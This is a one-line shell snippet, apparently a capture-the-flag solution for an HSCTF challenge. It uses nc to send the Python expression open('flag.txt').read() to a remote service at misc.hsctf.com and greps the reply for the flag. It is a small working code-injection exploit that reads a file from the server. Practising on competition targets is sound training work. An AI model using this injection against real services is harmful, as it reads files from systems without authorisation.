nc misc.hsctf.com 9001 <<EOF | grep -om1 hsctf{.*}
open("flag.txt").read()
EOF
